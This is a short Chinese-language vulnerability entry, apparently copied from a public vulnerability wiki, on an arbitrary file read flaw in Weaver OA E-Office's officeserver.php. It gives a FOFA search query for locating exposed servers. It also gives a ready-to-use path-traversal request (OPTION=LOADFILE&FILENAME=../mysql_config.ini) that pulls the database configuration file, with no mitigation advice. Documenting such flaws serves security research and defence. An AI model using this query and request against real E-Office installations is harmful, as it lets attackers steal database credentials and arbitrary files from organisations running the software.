---
title: "泛微OA E-Office officeserver.php 任意文件读取漏洞"
date: 2026-10-17 09:12:37
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

泛微OA E-Office officeserver.php文件存在任意文件读取漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
泛微OA E-Office
```

## FOF

```
app="泛微-EOffice"
```

## 漏洞复现

登录页面

![image-20220520140739224](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201407281.png)

验证POC

```
/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini
```

![image-20220520140749985](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201407034.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Office-officeserver.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
